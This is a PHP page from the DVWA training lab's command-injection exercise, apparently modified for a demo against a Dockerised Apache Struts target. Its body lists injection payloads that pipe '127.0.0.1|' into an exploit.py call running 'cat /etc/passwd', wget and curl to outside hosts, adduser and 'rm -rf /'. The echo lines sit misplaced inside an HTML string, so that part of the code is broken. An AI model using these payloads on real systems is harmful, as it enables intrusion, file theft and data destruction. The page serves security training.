<?php

define( 'DVWA_WEB_PAGE_TO_ROOT', '../../' );
require_once DVWA_WEB_PAGE_TO_ROOT . 'dvwa/includes/dvwaPage.inc.php';

dvwaPageStartup( array( 'authenticated', 'phpids' ) );

$page = dvwaPageNewGrab();
$page[ 'title' ]   = 'Vulnerability: Command Injection' . $page[ 'title_separator' ].$page[ 'title' ];
$page[ 'page_id' ] = 'exec';
$page[ 'help_button' ]   = 'exec';
$page[ 'source_button' ] = 'exec';

dvwaDatabaseConnect();

$vulnerabilityFile = '';
switch( $_COOKIE[ 'security' ] ) {
	case 'low':
		$vulnerabilityFile = 'low.php';
		break;
	case 'medium':
		$vulnerabilityFile = 'medium.php';
		break;
	case 'high':
		$vulnerabilityFile = 'high.php';
		break;
	default:
		$vulnerabilityFile = 'impossible.php';
		break;
}

require_once DVWA_WEB_PAGE_TO_ROOT . "vulnerabilities/exec/source/{$vulnerabilityFile}";

$page[ 'body' ] .= "
<div class=\"body_padded\">
	<h1>Vulnerability: Command Injection</h1>

	<div class=\"vulnerable_code_area\">
		<h2>Ping a device</h2>

		<form name=\"ping\" action=\"#\" method=\"post\">
			<p>
				Enter an IP address:
				<input type=\"text\" name=\"ip\" size=\"30\">
				<input type=\"submit\" name=\"Submit\" value=\"Submit\">
			</p>\n";

if( $vulnerabilityFile == 'impossible.php' )
	$page[ 'body' ] .= "			" . tokenField();

$page[ 'body' ] .= "
		</form>
		{$html}
	</div>

	<h2>Requirement: </h2>
  <h2>https://hub.docker.com/repository/docker/andrefernandes86/demo-apachestruts-target </h2>
  <h2>docker run -d --rm -p 81:8080 andrefernandes86/demo-apachestruts-target </h2>
		echo '127.0.0.1| python exploit.py http://target-ip/hello "ls -la"';
		echo '127.0.0.1| python exploit.py http://target-ip/hello "cat /etc/passwd"';
		echo '127.0.0.1| python exploit.py http://target-ip/hello "wget http://2016.eicar.org/download/eicar.com"';
		echo '127.0.0.1| python exploit.py http://target-ip/hello "curl http://wrs21.winshipway.com/"';
		echo '127.0.0.1| python exploit.py http://target-ip/hello "adduser xxxxx"';
		echo '127.0.0.1| python exploit.py http://target-ip/hello "ls -la"';
		echo '127.0.0.1| python exploit.py http://target-ip/hello "rm -rf /"';
</div>\n";

dvwaHtmlEcho( $page );

?>
